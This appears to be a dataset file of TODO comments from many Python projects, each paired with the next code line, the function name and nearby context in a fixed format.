# todo: in #5022 </s> email_context["order_details_url"] = build_absolute_uri(order.get_absolute_url())	collect_data_for_email recipient_email = order.get_customer_email() send_kwargs, email_context = get_email_context() email_context["order"] = order if template == CONFIRM_ORDER_TEMPLATE:
# todo - take this out of the menu </s> self.listening_for_connections.set(not self.listening_for_connections.get())	start_listening def start_listening(self, **kwargs): self.allow_connections(**kwargs) return
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_tags_wrong_type def test_fail_tags_wrong_type(self):
pass # todo </s> def startcdata(self):	startCDATA
# todo: 289 </s> policyauthor.__init__(self, *args, **kwargs)	Alice Character.__init__(self, *args, **kwargs) if kwargs.get('is_me') and not federated_only: self.federated_only = federated_only def generate_kfrags(self, bob, label, m, n) -> List:
# todo: remove once elasticsearch v6.x is deprecated. </s> if self._getclientmajorversion() < 7:	_FlushEvents 'index': self._index_name, 'request_timeout': self._DEFAULT_REQUEST_TIMEOUT} bulk_arguments['doc_type'] = self._document_type self._client.bulk(**bulk_arguments)
# todo: find the operation that does not properly close the oblivion\data dir. </s> try:	_move def _move(self, count, progress, stageDataDir): if count: destDir = dirs['mods'].head + u'\\Data'
assert study_id == 0  # todo(akiba) </s> trial_id = len(self.trials)	create_new_trial_id def create_new_trial_id(self, study_id): self.trials.append(trial.Trial(trial_id)) return trial_id
# todo: need token </s> e_die('undefined array %r', node.name)	_EvalLhs if val.tag == value_e.Undef: if self.exec_opts.strict_arith: a = [None] * (index + 1) v = 0
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: when dropping python 3.6, use </s> def run_coroutine(coro):	run_pyppeteer return pdf_data pool = concurrent.futures.ThreadPoolExecutor() loop = asyncio.new_event_loop() asyncio.set_event_loop(loop)
# todo: replace this root with tree hash root </s> proposal_root = proposalsigneddata(	validate_serenity_proposer_signature epoch_length: int) -> None: block_without_signature_root = block.block_without_signature_root state.slot, beacon_chain_shard_number,
# todo: handle agg_columns. </s> kdf = kdf[	GroupBy for i in range(groupkey_length) ] [s.rename(label) for s, label in zip(self._groupkeys, groupkey_labels)] + [kdf._kser_for(label) for label in kdf._internal.column_labels]
# todo: remove from self.workers (except that detached() should get </s> log.err(e, 'worker failed to attach')	attached return self except Exception as e: return None
# todo(mattjj): support argument pattern-matching </s> assert not any(type(invar) in (tuple, list) for invar in jaxpr.invars)	replicated_comp def replicated_comp(jaxpr, ax_env, const_vals, freevar_shapes, *arg_shapes): c = xb.make_computation_builder("replicated_computation") def read(v):
logfile = open('logs/exceptions.log', 'a') #todo: make not hardcoded </s> logfile.write('from %s at %s:\n' % (origin.sender, str(datetime.now())))	error print trace except: logfile.write('Message was: <%s> %s\n' % (trigger.nick, trigger.group(0))) logfile.write(trace)
# todo instead of indexing and filtering later </s> "hidden": bool(t.hidden),	mk_es "remake": bool(t.remake), "complete": bool(t.complete), "deleted": bool(t.deleted), "has_torrent": t.has_torrent,
# todo do a proper mro resolution. currently we are just listing </s> for cls in self.py_bases():	py_mro mro.add(cls) mro = [self] add(cls) for cls_new in cls.mro():
pass  # todo </s> def set_worksheet_name(xl_sheet, value):	set_worksheet_name
# todo: change href="$help:command" to href="help.html#command" </s> return ''.join(' %s="%s"' % (k, cgi.escape(v)) for (k, v) in attrs)	AttrsToString if not attrs: return ''
# todo return the property set too. see #1086 </s> name = dag.name	transpile_dag pass_manager.append([Optimize1qGates(), CXCancellation(), Depth(), FixedPoint('depth')], do_while=lambda property_set: not property_set['depth_fixed_point']) dag = pass_manager.run_passes(dag) dag.name = name
"""todo doc me""" </s> table = [['foo', 'bar', 'baz'],	test_profile_default def test_profile_default(): ['A', 1, 2], ['B', '2', '3.4'],
# todo: remove the coverage limitation with further mandatory model attributes </s> else:   # coverage: ignore branch	system_exporter_spreadsheet_xls_config_view info_logger(str(request.user), " SYSTEM_EXPORTER_SPREADSHEET_XLS_CONFIG_CHANGED") return HttpResponse('<script type="text/javascript">window.close();</script>') return render( request,
# todo: add highlighting line </s> return	mouseDoubleClickEvent new_line = self._lines.index(new_line[0]) self.verticalScrollBar().setValue(new_line) except IndexError: pass
# todo(b/184055743): once tensorflow is released with cl/342914534, </s> def int_domain_cleared(schema):	test3dSparseWithTFXIO if not tft_unit.is_external_environment(): expected_metadata.generate_legacy_feature_spec = False result = schema_pb2.Schema() result.CopyFrom(schema)
expr,  # todo rethink this circular import </s> )	get_gas_and_value def get_gas_and_value(stmt_expr, context): from vyper.old_codegen.expr import ( value, gas = None, None for kw in stmt_expr.keywords:
# todo: empty env? </s> sendrc=false, timeout=120, usepty=false, environ={},	test_simple Obfuscated('hushnow', 'XXXXXXXX'), 'client', '-i'], self.basedir, initialStdin=client_spec) + 0,
# todo(shoyer): test fails on tpu </s> if jtu.device_under_test() == "tpu":	test_root_scalar def test_root_scalar(self): raise SkipTest("Test fails on TPU") def scalar_solve(f, y):
# todo: bindings should be done in collection class: </s> metacollection.conjunctive_graph.bind('dlns', dlns)	__call__ for remote in local_master.git_get_remotes()] + [local_master.get_backend_from_branch()]) query_string = """SELECT ?g ?r {GRAPH ?g {?r rdf:type dlns:Handle . ?s ?p ?o .
# todo: use the kinetic scroller if implemented </s> view = self.parent().parent()	drag if dy < 0: dy = 0 view.startScrolling(QPoint(dx, dy))
# todo(b/141131288): enable test once complex sort is supported on tpu. </s> if (jnp.issubdtype(dtype, jnp.complexfloating)	testLexsort for axis in (-1, *range(len(shape) - 1)))) def testLexsort(self, dtype, shape, input_type, axis): and jtu.device_under_test() == "tpu"): self.skipTest("complex sort not supported on TPU")
# todo: same code as for batch gradient, but with sum_batch = true </s> def bias(self, module, grad_input, grad_output):	bias shape = module.bias.shape bias_grad = self.bias_jac_t_mat_prod(
# todo: https://github.com/python/mypy/issues/3004 </s> if self.merge:	_proc spans = self.get_spans(doc, pattern, label or self._DEFAULT_LABEL) doc.ents = filter_spans(tuple(spans) + doc.ents)  # type: ignore merge_spans(doc, spans) return doc
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
our_balance = our_balance - have_amount  #todo i think this line is unnecessary here </s> want_amount = have_amount * round(band.avg_price(target_price))	top_up_sell_bands have_amount = Wad.min(band.avg_amount - total_amount, our_balance) if (have_amount >= band.dust_cutoff) and (have_amount > Wad(0)): if want_amount > Wad(0): order = self.radar_relay.create_order(maker_token_amount=have_amount,
# todo: this should maybe go somewhere else </s> 'logical_not': np.logical_not}	variables_to_namespace def variables_to_namespace(self): self.namespace = {'_owner': self.owner, self.nonconstant_values = [] for name, var in self.variables.iteritems():
# todo: remove </s> return []	get_sub_commads def get_sub_commads(self):
# todo(elliot): how to determine bundle id </s> "id": "%bundleid%",	handle_download_recipe_input "pkgname": "%NAME%-%version%", "version": "%version%", "options": "purge_ds_store", "chown": (
#todo can the fetchparser code be adapted for use here? </s> folder_text = none	list_folders folders = [] for line in data: if isinstance(line, tuple): folder_text = line[-1]
# todo: handle na as 1st value </s> if len(val) > 0 and isinstance(val[0], str):  # and isinstance(val[-1], str):	typeof_pd_str_series @typeof_impl.register(pd.Series) def typeof_pd_str_series(val, c): arr_typ = string_array_type elif len(val) > 0 and isinstance(val.values[0], datetime.date):
#todo: raise an exception: unexpected date format </s> pass	pipe_dateformat pass else: s = time.strftime(date_format, s)   #todo check all PHP formats are covered by Python yield s
# todo: verify </s> manager.unregistered(self.consumer_id)	test_unregistered manager = factory.consumer_agent_manager()
raise notimplementederror  # todo(mattjj,frostig) </s> def process_call(self, call_primitive, f, tracers, params):	process_call
log("dispersy.log", "handled-barter-record") # todo: maybe move to barter.log </s> try:	on_barter_record with self._database as execute: for message in messages: first_member, second_member, global_time = \ execute(u"SELECT first_member, second_member, global_time FROM \
# todo is this check necessary; this was an assertion which are disabled in <4000 which is good </s> if value != '' and not value.isdigit():	set_motion_count def set_motion_count(view, value: str) -> None: raise ValueError() set_session_view_value(view, 'motion_count', value)
# todo read2 is silently discarded </s> return	ProcessedReadWriter if self.too_long_outfile is not None: read1.write(self.too_long_outfile) if read2 is None: if read1.trimmed and self.trimmed_outfile:
# todo %b, %(fmt)t, plus "the standard ones in printf(1)" </s> raise notimplementederror	Printf parts.append(str(num)) else: result = ''.join(parts) if arg.v:
# todo disjunct can be fathomed? </s> else:	_apply_to elif results.solver.termination_condition is tc.infeasible: disj_lb = None raise NotImplementedError( "Unhandled termination condition: %s"
with open(filename, 'r', encoding='iso-8859-1') as f:  # todo: solve iso encoding pb ! </s> for line in f:	loadConversations dict<??>: the extracted fields for each line conversations = [] values = line.split(" +++$+++ ") convObj = {}
# todo: fix this 405 error </s> data = rv.data.decode('utf-8')	test_model_list_order rv = client.post('/model1view/list?_oc_Model1View=field_string&_od_Model1View=desc', follow_redirects=True)
# todo move to function </s> if not self.lock_file:	__init__ signal(SIGINT, self.cleanup_and_exit) signal(SIGTERM, self.cleanup_and_exit) self.lock_file = '/tmp/%s.lock' % self.program_name time_string = datetime.now().strftime("%Y%m%d_%H%M")
# todo: test this case </s> a.shape += (1,) * difference	_reconcile if difference > 0: if a.ndim: else: a = full_like(b, a)
# @todo: deprecate </s> ireport_search = s3search(	S3IRSModel ), ] advanced=( S3SearchSimpleWidget(
# todo: supports blocking queries and all consistency modes </s> pass	Catalog pass def service(self, service, dc=None, tag=None):
asynchronous=false, # todo: (true) when jconnor fixes </s> archive=true,)	uninstall resources=resources, weight=0, result = execution.execute_async(self, call_request) return result
# @todo this needs to be using domain fronting to defeat censorship </s> response = requests.get(endpoint)	censorship_obtain_settings_from_api the requesting IP. endpoint = "https://bridges.torproject.org/moat/circumvention/settings" self.censorship_settings = response.json() self.log(
# todo: maybe a chardet integration </s> return cls.default_encoding	_detect_encoding if first_chars.startswith(bom): return encoding
# todo: implement these buttons </s> self.new_button = b = qpushbutton(qicon(i('plus.png')), _('&new recipe'), self)	setup_ui s.addWidget(rl) l.addWidget(self.bb) b.setToolTip(_('Create a new recipe from scratch')) self.customize_button = b = QPushButton(QIcon(I('news.png')), _('Customize &builtin recipe'), self)
# todo: check whether it's already installed?. see yum notes  yum list installed "$@" >/dev/null 2>&1 </s> self.send(' yum list installed ' + package + ' > /dev/null 2>&1',check_exit=false,loglevel=logging.debug)	package_installed return self.send_and_get_output(' dpkg -s ' + package + """ | grep '^Status: install ok installed' | wc -l""",loglevel=logging.DEBUG) == '1' elif self.current_environment.install_type == 'yum': return self.get_exit_value(shutit) else:
# todo: make this query also check over the alias table. </s> resolve_email_to_cntrb_id_sql = s.sql.text("""	insert_facade_contributors self.logger.info( f"Contributor id not able to be found in database despite the user_id existing. Something very wrong is happening. Error: {e}") select distinct cntrb_id, contributors.cntrb_email, commits.cmt_author_raw_email from
# todo: this is not the correct setting. set hyperparameters correctly </s> ecfp_power = 5	load_pdbbind labels.append(log_label) if featurizer == "grid": splif_power = 5 featurizer = rgf.RdkitGridFeaturizer(
#todo: dry [1] </s> if event._end_time:	duration def duration(event, line): if line: raise ValueError("An event can't have both DTEND and DURATION") event._duration = parse_duration(line.value)
candidates.sort() # todo: this sort has side effects </s> candidates[0][1].activesite = self	getElementBeforeOffset nearestTrailSpan = span if len(candidates) > 0: return candidates[0][1] else:
cursor.execute('''delete from mempool_messages''')  # todo </s> cursor.execute('''select * from transactions \	follow except exceptions.BitcoindError: pass WHERE block_index = ?''', (config.MEMPOOL_BLOCK_INDEX,))
# todo: using get_fft_info is digging into the implementation </s> self.assertequal(top.state()['monitor'].get()._get_fft_info()[0], freq1)	test_monitor_vfo_change dev = SimulatedDeviceForTest(freq=freq1, allow_tuning=True) top = Top(devices={'s1': dev}) dev.set_freq(freq2) yield deferLater(the_reactor, 0.1, lambda: None)  # wait for tune delay
# todo: implement this </s> print("todo: implement selectionchanged signal of lineedit_hexview")	lineEdit_HexView_selection_changed def lineEdit_HexView_selection_changed(self): raise NotImplementedError
#todo:  raise error </s> raise b2requesterror(decode_error(response))	delete else:
# todo: overwrite step's self return value on fitting. </s> data_inputs = step.fit_transform(data_inputs, expected_outputs)	ResumablePipelineRunner def fit(self, data_inputs, expected_outputs=None): for step_name, step in self.steps_as_tuple[:-1]: processed_outputs = self.steps_as_tuple[-1][-1].fit(data_inputs, expected_outputs) return processed_outputs
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo behind </s> f.write(u" behind todo")	print_Show f.write(u" as %s" % (stmt.imspec[2], )) if stmt.imspec[6] is not None: if stmt.imspec[4] != 'master': f.write(u" onlayer %s" % (stmt.imspec[4], ))
# todo: we could assert here that latest_version matches x.y.z. </s> return version	get_current_release_version e.g. "2.1.1" version = get_current_release_tag()[len('ckan-'):]
# todo detect for typeerror: duplicate base class str, </s> add(cls)	py_mro mro = [self] for cls in self.py_bases(): for cls_new in cls.mro(): add(cls_new)
# todo: currently not used by pyrep. </s> parameterlength = ffi.new('int*')	simGetUserParameter def simGetUserParameter(objectHandle, parameterName): parameterValue = lib.simGetUserParameter( objectHandle, parameterName.encode('ascii'), parameterLength)
# todo make private methods private </s> '--sdist', 'mysdist'])	test_output_file_not_required '--flocker-version', '0.3.0',
# todo: can we assume reverse=false? </s> signals.m2m_changed.send(	clear def clear(self): db = router.db_for_read(self.through, instance=self.instance) sender=self.through, action="pre_clear", instance=self.instance, reverse=False,
# todo: check against cygwin </s> else:	__init__ else: shutit_global.shutit.fail('Should not get here: environment reached but with unique build_id that matches, but object not in existence')
# todo - unittest this </s> if args is none:	make_runit_dir def make_runit_dir(service_name, path, args=None, make_logdir=True): args = get_default_args() makedirs(path)
# todo: write this </s> pass	catmull_rom_prism_smooth def catmull_rom_prism_smooth():
# todo -- validate other options </s> die("[%s] has no 'url'" % target)	_validate_trac if not config.has_option(target, 'url'):
# todo delete me </s> import yaml	parseSDFInertial list(inertia), key=lambda el: el.tag)] inertial_dict['name'] = 'inertial_' + link.attrib['name'] print(yaml.dump(inertial_dict)) return inertial_dict
#todo: consider factoring out: some duplication between xliff and tmx </s> text = errorname + ': ' + errortext	adderror def adderror(self, errorname, errortext): self.addnote(text, origin="pofilter")
if self.source_file:  # todo: should we error here or something if the source_file doesn't exist? </s> try:	_create if lazy and (getattr(self, '_file', None) or self.storage.exists(self.name)): return fp = self.source_file.storage.open(self.source_file.name) except IOError:
# todo: implement </s> pass	get_error_codes @classmethod def get_error_codes(cls):
#obj_url = url_for(self.get_endpoint(), **params) # doesn't work :(, todo : why? </s> obj_url = url_for(self.get_endpoint())	_s_jsonapi_encode MAY also contain pagination links under the links member, as described below. SAFRS currently implements links with self if not obj_url.endswith('/'): obj_url += '/'
@unittest.skipif(not settings.dev_mode, 'dev_mode disabled, osf.users.create unavailable')  # todo: remove when available outside of dev_mode </s> def test_properly_scoped_token_can_create_without_username_but_not_send_email(self, mock_auth, mock_mail):	test_properly_scoped_token_can_create_without_username_but_not_send_email @mock.patch('framework.auth.views.mails.send_mail') @mock.patch('api.base.authentication.drf.OSFCASAuthentication.authenticate') token = ApiOAuth2PersonalToken( owner=self.user,
# todo(shoyer): test fails on tpu </s> if jtu.device_under_test() == "tpu":	test_root_scalar def test_root_scalar(self): raise SkipTest("Test fails on TPU") def scalar_solve(f, y):
pass  # todo </s> def test_shapes(self):	test_shapes
# todo should this be null cut? </s> partition=subsystem.null_cut,	_null_mip return BigMip(subsystem=subsystem, phi=0.0, unpartitioned_constellation=[], partitioned_constellation=[])
# todo: underscore </s> block.has_replaced_expressions = true	setup_sensitivity block.constList.add(expr=(new_upper >= new_body)) con.deactivate() block.paramConst = ConstraintList() for var, param, _, _ in sens_data_list:
#todo: gst.numberoftableentries = len(confs) </s> idx = confs.index(guid)	SmmInstallConfigurationTable if guid not in confs: confs.append(guid) ptr = ql.loader.smm_conf_table_array_ptr + (idx * EFI_CONFIGURATION_TABLE.sizeof()) instance = EFI_CONFIGURATION_TABLE()
# todo model? </s> cut_result_json = os.path.join(data_home, "cut_result.json")	classify :param limit: ignore some ranges which are too short, 5 means ignore stable ranges which length < 5 :return: typing.List[ClassifierResult] stable = None if os.path.isfile(cut_result_json):
# todo pseudo code: </s> pass	OpenUri @dbus.service.method(dbus_interface=player_interface) def OpenUri(self, uri):
sleep(1)    # todo </s> cancel_order(db, bad_order, 'penalty', block_index)	exact_penalty for bad_order in bad_orders: print('PENALTY: ', bad_order['tx_hash'])    # TODO bad_order_matches = list(cursor.execute('''SELECT * FROM order_matches \ WHERE (tx0_address = ? AND forward_asset = ?) OR (tx1_address = ? AND backward_asset = ?)''',
# todo wait_for_unit_state? why (not)? </s> def get_ips(units):	setUp d.addCallback(lambda _: self.client.add(node_2_name, image)) d.addCallback(lambda _: self.client.list()) docker = Client() prefix = u'flocker--' + namespace + u'--'
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo: return false to disable selection. </s> return true	selectionShouldChangeInTableView_ @objc_method def selectionShouldChangeInTableView_(self, table) -> bool:
#todo: manage this </s> pass	get_return_description_indexes end = idx_abs if self.type in ['params', 'unknown'] and (start, end) == (-1, -1): return (start, end)
# todo(stephenfin): the mock of 'migrate_disk_and_power_off' should </s> with mock.patch('nova.virt.libvirt.driver.libvirtdriver'	test_resize_dedicated_policy_race_on_dest_bug_1953359 def fake_finish_resize(*args, **kwargs): self._run_periodics() '.migrate_disk_and_power_off', return_value='{}'): with mock.patch(
if self.idx_dim != 0: raise notimplementederror  # todo... </s> d_array = d_array_and_pad[:array.shape[self.idx_dim]]	grad D_array_and_pad = T.zeros(D_array_and_pad_shape, dtype="float32") D_array_and_pad = grad_op(D_array_and_pad, start_idxs, batch_lens, beam_width, D_beam) if self.wrap_mode == "wrap_around": D_pad_left = D_pad_right = T.DisconnectedType()()
# todo: handle hiframes filter etc. </s> if (isinstance(inst, parfor)	_rebalance_arrs for label, block in self.func_ir.blocks.items(): for inst in block.body: and parfor_dists[inst.id] == Distribution.OneD_Var): array_accesses = ir_utils.get_array_accesses(inst.loop_body)
# todo: is there any way to move this to serializer? </s> return {	country_totals deaths = state_totals["total_deaths"] population = state_totals["total_population"] "city": "Brasil", "city_ibge_code": 0,
# todo: throw a useful error message </s> with ng.op.all_ops() as ops:	layer_wrapper if prev_inp.axes.sample_axes() != inp.axes.sample_axes(): pass output = f(self, in_obj, *inputs, **kwargs) if self.ops is None:
assert study_id == 0  # todo </s> self.trials[trial_id].params[param_name] = param_value	set_trial_param def set_trial_param(self, study_id, trial_id, param_name, param_value):
#todo load this from somewhere </s> pad_data = [-1.46374, -0.151816, -0.161173, 0.0686325, 0.0231148, -0.154613,	assign_dev_data device.targets[:l, q] = self.data.targets[self.data.seq_start[s] + batch.start[1]:self.data.seq_start[s] + batch.start[1] + l] if self.pad_batches: -0.105614, 0.00550198, 0.0911985, 0.00502809, 0.0512826, -0.0181915, 0.0225053, -0.00149681, 0.0782062, 0.0412163, 0.0526166, -0.0722563,
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(133) # 10000101	SetMotorCW def SetMotorCW(self):
response.set_cookie(cookie_name, cookie, 31536000, path='/') # todo: move cookie max_age to settings </s> return response	rating_added_response response.delete_cookie(cookie_name) else:
# todo remove this sleep to reproduce http://tracker.ceph.com/issues/8107 </s> import time	test_modification pool_id = self._assert_visible(cluster_id, pool_name)['id'] pool = self.api.get("cluster/%s/pool/%s" % (cluster_id, pool_id)).json() time.sleep(10) mods = {
#@todo: 1) perform some sort of check to test the export works </s> browser.find_element_by_xpath("//img[@src='/eden/static/img/pdficon_small.gif']").click()	test_export_staff browser = self.browser
recording_software_name = none  # todo </s> recording_software_version = none  # todo	_recording_update_legacy_from_v1_15_to_pprf_2_0 start_time_synced_s = None  # TODO duration_s = None  # TODO recording_name = None  # TODO system_info = None #TODO
# todo: use idc.nexthead(ea) instead... </s> ea += self.arch.insn_size	argc if argv.union(notargv) == set(self.arch.argv): break return len(argv)
# todo fixme is that utc??? </s> tss = tss.replace('juli', 'jul').replace('aug.', 'aug')	measurements for _, tss, temp, hum, pres, dew in datas: tot += 1 dt = datetime.strptime(tss, '%Y-%b-%d %H:%M') if dt in emitted:
# todo: add rotary inertia </s> mass = elem.mass()	build_Mgg Mbb[j1, j1] = Mbb[j1+1, j1+1] = mass / 2 elif etype == 'CTRIA3': nid1, nid2, nid3 = elem.nodes i1 = dof_map[(nid1, 1)]
# todo: replace with positional arguments when we drop python 2 support. </s> cache_alias = kwargs.pop('cache_alias', none)	get_last_invalidation :returns: The timestamp of the most recent invalidation :rtype: float db_alias = kwargs.pop('db_alias', None) for k in kwargs:
# todo : accept pay and keywords as parameters too </s> now = datetime.utcnow()	filter_types def filter_types(geonameids=[], filtered_categories=[]): basequery = db.session.query(JobPost.type_id).filter(JobPost.status.in_(POSTSTATUS.LISTED), JobPost.datetime > now - agelimit) if filtered_categories:
size = ()  # todo(kataoka): remove this after #4615 is merged </s> size = core.get_size(size)	_generate_normal def _generate_normal(self, func, size, dtype, *args): if size is None: element_size = functools.reduce(operator.mul, size, 1) if element_size % 2 == 0:
# todo: create dicts as we go, for now we can only assign into existing namespaces </s> namespace = meta	assign_fields if val and val[0] in "+-" and val[1:].isdigit(): val = int(val, 10) for key in field.split('.')[:-1]: namespace = namespace[key]
@unittest.skip('not written')  # todo: finish! </s> raise notimplementederror	test_named_struct def test_named_struct(self):
# todo: add supported sources when implemented </s> return none	supported_source_kinds @property def supported_source_kinds(self):
# todo - needs tests </s> def process_request(self, request):	SubscriptionPaymentMiddleware "home",  # Site homepage ) EXEMPT = DJSTRIPE_SUBSCRIPTION_REQUIRED_EXCEPTION_URLS if request.user.is_authenticated() and not request.user.is_staff:
# todo(yanase): change `task` in storages to `direction`. </s> self.storage.set_study_task(self.study_id, _direction)	optimize 'Currently, Optuna supports `MINIMIZE` only.'.format(self.study_name)) if self.direction == structs.StudyTask.NOT_SET: elif self.direction != _direction: raise ValueError(
# todo: may use sys.stdout.encoding if output_file = '-' </s> output_encoding = output_encoding or sys.stdout.encoding or \	query_ def query_(input_encoding, output_encoding, input_locale, output_locale, verify_ssl, fields, source, query, destination): DEFAULT_OUTPUT_ENCODING if not query.lower().startswith('select'):
# todo: change download_list to list </s> return download_list	maintain_download_list download_list[key] = package
# todo: 评估对所有订阅都只取title作为id的效果和影响，考虑基于内容相似度的算法 </s> if link and 'cnki.net/' in link:	_extract_story_ident_v3 link = link.rsplit('#', 1)[0] return title or link if guid:
# todo: this is an important operation that should be controlled </s> return "python"	_python_cmd def _python_cmd(_opdef):
# todo: it's a stub before we implement compute_per_cycle_transition </s> crystallized_state = crystallized_state.copy(	compute_cycle_transitions block, ) last_state_recalc=crystallized_state.last_state_recalc + cls.config.CYCLE_LENGTH )
# todo: add more complicated testcases </s> assert_equal(score.shape, (4,))	test_aom_static_repeat random_state=42)
# todo(sbiswas7): remove this check once we move to glance v2 </s> if conf.glance.use_glance_v1:	get_remote_image_service except ValueError: raise exception.InvalidImageRef(image_href=image_href) image_service = GlanceImageService(client=glance_client) else:
# todo(pdmars): this should probably be changed to a more generic </s> db_infos = dbinstance.find_all(deleted=false)	load @classmethod def load(cls): tenant_ids_for_instances = [db_info.tenant_id for db_info in db_infos] tenant_ids = set(tenant_ids_for_instances)
# todo(shafey, yonghui): fetch axis_name from globals. </s> sum_vv = jax.lax.psum(sum_vv, axis_name='batch')	compute_moments keepdims=keepdims) if enable_cross_replica_sum_on_tpu: variance = sum_vv / count_v return mean, variance
# todo: use parameter names for run_in_executor() once python 3.4.4 is released. </s> task = loop.run_in_executor(	launch_ec2 tasks = [] for instance in reservation.instances: None, functools.partial(
raise notimplementederror #todo </s> elif q.kw(i,"format"):	parse while i < l: if q.kw(i,"RETURN"): raise NotImplementedError #TODO elif q.kw(i,"REQUEST"):
# todo: don't mess with the user's cursor. </s> sel = self.view.sel()	on_navigate def on_navigate(self, href, point, diagnostics): sel.clear() sel.add(sublime.Region(point, point))
pass  # todo </s> def train_check_calc_loss(self):	train_check_calc_loss
# todo: add tests </s> (pkg_without_arch_name, arch) = pkg_name.split(":", -1)	is_bucket_available if pkg_name not in self.cache: if ":" in pkg_name: if arch == get_current_arch() and pkg_without_arch_name in self.cache:  # false positive, available continue
# todo - this isn't actually the correct way to set the vary header, </s> response.headers['allow'] = ', '.join(self.allowed_methods)	dispatch except ErrorResponse, exc: response = exc.response response.headers['Vary'] = 'Authenticate, Accept' return self.emit(response)
## todo - fix - this breaks easily </s> if v.strip().startswith('return ') and '*'+gt != return_type:	_visit_function v = self.visit(b) if v: if gname in v and v.strip() != 'return self': if '(' not in v:
# todo: does it occur when opening a file with line numbers in it? </s> if self._propose_remove_line_numbers and isinstance(args[1], str):	TextWrapper if text >= "\uf704" and text <= "\uf70d": # Function keys F1..F10 in Mac cause these return args = tuple((args[0],) + (try_remove_linenumbers(args[1], self.text),) + args[2:]) self._original_user_text_insert(*args, **kw)
# todo yield str </s> state = 0	cpre2_parse elif state == 25: # 'str if c == "'": elif c == "\\": state = 26 else: laststr += c
return 0 # todo </s> def to_mopidy_id(spotify_uri):	to_mopidy_id
# todo(halldor): not tested... </s> self._mailbox.store(key, "+flags", r"\deleted")	remove def remove(self, key):
# todo: config option? </s> lgr.info(	_install_subds_from_flexible_source if subrepo.get_merge_base( [branch_hexsha, detached_hexsha]) == detached_hexsha: "Submodule HEAD got detached. Resetting branch %s to point " "to %s. Original location was %s",
# todo: remove this method in v2.5 </s> elif self._values['disabled'] in booleans_true:	disabled if self._values['state'] == 'disabled': return True return True elif self._values['disabled'] in BOOLEANS_FALSE:
# todo: we should run multithreaded at some point </s> cache =  synchronizeds3cache(bucket, cachedir, int(options.cachesize*1024*1.15), dbcm,	run_server log.info('Mounting filesystem...') fuse_opts = get_fuse_opts(options) timeout=options.s3timeout) cache.start_background_expiration(int(options.cachesize * 1024 * 0.85))
# todo make sure we can still read an unconstrained successor </s> self._windup_to_unconstrained_successor()	_read_in_global_data_with_read chain_bvv = self.crash.state.BVV(chain.payload_str()) self.crash.state.add_constraints(chain_mem == chain_bvv) glob_data = self.crash.state.memory.load(read_to, len(data)) data_bvv  = self.crash.state.BVV(data)
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# todo: finish this. </s> pass	mkdir def mkdir(self, path, mode):
# todo: https://twistedmatrix.com/trac/ticket/10137 </s> if self._buffer.startswith(b"\r\n"):	_dataReceived_CRLF chunk data. @returns: C{True} when the CRLF have been read, otherwise C{False}. self.state = "CHUNK_LENGTH" del self._buffer[0:2]
# todo: fixup when moving to python 3.3 </s> if (sys.version_info[0] == 2):	test_multivalued_data_encoding a list for service in SERVICES: nonascii = '\xc3\xa9'.decode('utf-8') else:
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
'alexnet'       : [testmodels.caffeemit, testmodels.cntkemit, testmodels.coremlemit, testmodels.mxnetemit, testmodels.pytorchemit, testmodels.tensorflowemit], # todo: testmodels.kerasemit('tensor' object has no attribute '_keras_history') </s> 'inception_v1'  : [testmodels.caffeemit, testmodels.cntkemit, testmodels.coremlemit, testmodels.kerasemit, testmodels.mxnetemit, testmodels.pytorchemit, testmodels.tensorflowemit],	get_test_table elif six.PY2: return { 'caffe' : { 'inception_v4'  : [TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.KerasEmit, TestModels.PytorchEmit, TestModels.TensorflowEmit], # TODO TestModels.MXNetEmit(Small error), TestModels.CaffeEmit(Crash for shape) 'resnet152'     : [TestModels.CaffeEmit, TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.KerasEmit, TestModels.MXNetEmit, TestModels.PytorchEmit, TestModels.TensorflowEmit],
# todo: python3 </s> packed['obj'] = str(base64.b64encode(pickle.dumps(obj)))	_serialize packed['uuid'] = str(uuid.uuid4()) if self.serializer == 'pickle': elif self.serializer == 'json': packed['obj'] = obj
# todo use an interface here and move the check inside </s> if isinstance(v, exportedgetter):	state if not hasattr(self, k): continue v = getattr(type(self), k) if not k.startswith('get_'): raise LookupError('Bad getter name', k)
# todo: re-enable when python3 is available on darwin </s> mx.log("running tests with cpython")	graalpython_gate_runner mx.command_function("python")(test_args) if platform.system() != 'Darwin': mx.run(["python3"] + test_args, nonZeroIsFatal=True) with Task('GraalPython downstream R tests', tasks, tags=[GraalPythonTags.downstream, GraalPythonTags.R]) as task:
# todo: add savedmodel support for sparse inputs. </s> del features["unigrams"]	test_model_to_saved_model_dense_inputs features = {} features.update(self.features) self.assertAllClose( ranker(features, training=False).numpy(), output.numpy())
# todo(kgriffs): this decorator does not work on callable </s> def shim(req, resp, resource):	_wrap_with_after shim = action else: action(req, resp) if is_method:
# todo: what does constructor of gitconfigparser, in case file doesn't exist? </s> parser = gitconfigparser(gitmodule_path)	get_module_parser from os.path import exists gitmodule_path = opj(repo.path, ".gitmodules") parser.read() return parser
# todo incorporate inter-bin distances </s> observations = [arm.log2.values	as_observation_matrix in each numpy array. Returns: List of numpy.ndarray, one per chromosome arm. for _c, arm in cnarr.by_arm()] return observations
